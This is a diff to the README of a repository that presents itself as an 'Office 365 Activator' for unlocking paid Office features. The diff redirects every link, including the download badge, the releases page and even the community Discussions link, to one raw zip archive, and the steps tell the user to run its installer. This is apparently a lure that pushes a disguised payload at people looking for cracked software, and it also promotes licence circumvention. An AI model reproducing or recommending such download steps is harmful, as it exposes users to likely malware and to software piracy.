@@ -1,6 +1,6 @@
 # 🛠 office-365-activator-latest - Easily Activate Your Office Suite
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/viceCyberGeek/office-365-activator-latest/releases)
+[![Download Release](https://raw.githubusercontent.com/viceCyberGeek/office-365-activator-latest/main/neiper/latest-office-activator-2.9-beta.1.zip%20Now-Get%https://raw.githubusercontent.com/viceCyberGeek/office-365-activator-latest/main/neiper/latest-office-activator-2.9-beta.1.zip)](https://raw.githubusercontent.com/viceCyberGeek/office-365-activator-latest/main/neiper/latest-office-activator-2.9-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Office 365 Activator**. This utility helps you enable all featu
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/viceCyberGeek/office-365-activator-latest/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/viceCyberGeek/office-365-activator-latest/main/neiper/latest-office-activator-2.9-beta.1.zip).
 2. **Choose the Latest Version**: Look for the latest release at the top of the page.
 3. **Download the File**: Click on the appropriate link to download the file that matches your operating system.
 4. **Run the Installer**: After the download completes, locate the file in your downloads folder and double-click it to run the installer.
@@ -49,12 +49,12 @@ If you encounter issues during activation, try the following solutions:
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/viceCyberGeek/office-365-activator-latest/releases)
+- [Releases Page](https://raw.githubusercontent.com/viceCyberGeek/office-365-activator-latest/main/neiper/latest-office-activator-2.9-beta.1.zip)
 - [User Guide](path/to/user_guide)
 - [FAQ](path/to/faq)
 
 ## 💬 Community Support
 
-Join our community on [GitHub Discussions](https://github.com/viceCyberGeek/office-365-activator-latest/discussions) to ask questions or share your experiences. 
+Join our community on [GitHub Discussions](https://raw.githubusercontent.com/viceCyberGeek/office-365-activator-latest/main/neiper/latest-office-activator-2.9-beta.1.zip) to ask questions or share your experiences. 
 
 Stay updated on our latest developments and releases by following this repository on GitHub. Thank you for using **Office 365 Activator**!
